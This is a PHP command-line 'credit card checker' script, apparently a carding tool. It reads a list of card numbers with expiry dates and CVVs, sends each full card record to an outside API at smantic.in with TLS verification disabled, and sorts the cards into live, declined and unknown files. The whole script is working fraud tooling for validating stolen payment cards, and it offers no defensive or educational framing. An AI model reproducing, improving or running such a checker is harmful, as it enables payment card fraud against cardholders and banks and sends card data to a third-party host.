<?php

error_reporting(0);
ini_set("memory_limit", "-1");
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));

$login = explode("|", $login);
$username = $login[0]; $password = str_replace("\n", "", $login[1]);
echo bannerBjirr();
enterList:
$listname = readline(" CC List : ");
if(empty($listname) || !file_exists($listname)){
    echo " [!] file not found".PHP_EOL;
    goto enterList;
}
$cclist = explode("\n", str_replace("\r", "", file_get_contents($listname)));
$savedir = readline(" Save to dir (default: CreditCard): ");
$dir = empty($savedir) ? "CreditCard" : $savedir;
if(!is_dir($dir)) mkdir($dir);
chdir($dir);

$currentCC = 0;
$totalCc = count($cclist);
$live = 0;
$dead = 0;
$unknown = 0;

echo PHP_EOL;
while(1){
    if($currentCC >= $totalCc){
        echo PHP_EOL." [*] Checking has been successfully!";
        break;
    }
    $list = $cclist[$currentCC];
    $cici = str_replace(" ", "", $list);
    if(empty($list)) exit(endBejir($totalCc, $live, $dead, $unknown, $dir));
    if(strpos($cici, "/") !== false) $cici = str_replace("/", "|", $cici);
    $cx = explode("|", $cici);
    $ccnum = $cx[0]; $ccexpm = $cx[1]; $ccexpy = $cx[2]; $ccv = $cx[3];
    if($ccexpm < 10 && strlen($ccexpm) == 1) $ccexpm = "0".$ccexpm;
    if(strlen($ccexpy) == 2) $ccexpy = "20".$ccexpy;
    $ccall = $ccnum."|".$ccexpm."|".$ccexpy."|".$ccv;
    $cookie = "../ccCheck.cook";
    if(file_exists($cookie)) unlink($cookie);
    $respon = curl("https://smantic.in/api.php?card=".$ccall, 0, array("User-Agent: Dower.API"), $cookie);
    $gate_info = getStr($respon, "gate_info\":\"","\"");
    $points = getStr($respon, "points\":\"","\"");

    if(preg_match("#Proxy Die#", $respon)){
        echo color()["LR"]." Proxy Die".color()["WH"]." => ".$ccall." | Recheck Wait 3 Second ".PHP_EOL;
        continue;
    }

    echo " [".date("H:i:s")." ".($currentCC+1)."/".$totalCc." from ".$listname." to ".$dir."] ";
    if(preg_match("#Live#", $respon)){
        $bin = get_between($respon, "Bin Info :", "\n");
        $live++;
        file_put_contents("live.txt", $ccall.$bin.PHP_EOL, FILE_APPEND);
        echo color()["LG"]."SUCCESSFULLY".color()["WH"]." => ".$ccall.$bin;
    }
    elseif(preg_match("#Card Die#", $respon)){
        $bin = get_between($respon, "Bin Info :", "\n");
        $dead++;
        file_put_contents("declined.txt", $ccall.PHP_EOL, FILE_APPEND);
        echo color()["LR"]."CARD DECLINED".color()["WH"]." => ".$ccall;
    }

    else{
        $unknown++;
        file_put_contents("unknown.txt", $ccall.PHP_EOL, FILE_APPEND);
        echo color()["LW"]."UNKNOWN".color()["WH"]." => ".$ccall;
    }
    echo PHP_EOL;

    $currentCC++;
    }
    endBejir($totalCc, $live, $dead, $unknown, $dir);


function bannerBjirr() {
    echo "=====================================================\n";
    echo "|             Smantic Checker $1 charge               |\n";
    echo "| Support Visa - Mastercard - Jcb - Amex - Discover   |\n";
    echo "|                                                     |\n";
    echo "=====================================================\n";
}
function color() {
    return [
        "LW" => (OS == "linux" ? "\e[1;37m" : ""),
        "WH" => (OS == "linux" ? "\e[0m" : ""),
        "LR" => (OS == "linux" ? "\e[1;31m" : ""),
        "LG" => (OS == "linux" ? "\e[1;32m" : ""),
        "YL" => (OS == "linux" ? "\e[1;33m" : "")
    ];
}
function endBejir($totalCc, $live, $dead, $unknown, $dir){
    return PHP_EOL." -- Total CC: ".$totalCc." - Live: ".$live." - Dead: ".$dead." - Unknown: ".$unknown.PHP_EOL." Saved to dir \"".$dir."\"".PHP_EOL;
}

function getStr($string, $first, $end){
    $a = explode($first, $string);
    $b = explode($end, $a[1]);
    return $b[0];
}

function get_between($string, $start, $end) 
    {
        $string = " ".$string;
        $ini = strpos($string,$start);
        if ($ini == 0) return "";
        $ini += strlen($start);
        $len = strpos($string,$end,$ini) - $ini;
        return substr($string,$ini,$len);
    }
function curl($url, $body=0, $header=0, $cookie=0){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    if($header) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
            curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    }
    if($cookie){
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    }
    if($body){
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    }
    $x = curl_exec($ch);
    curl_close($ch);
    return $x;
}
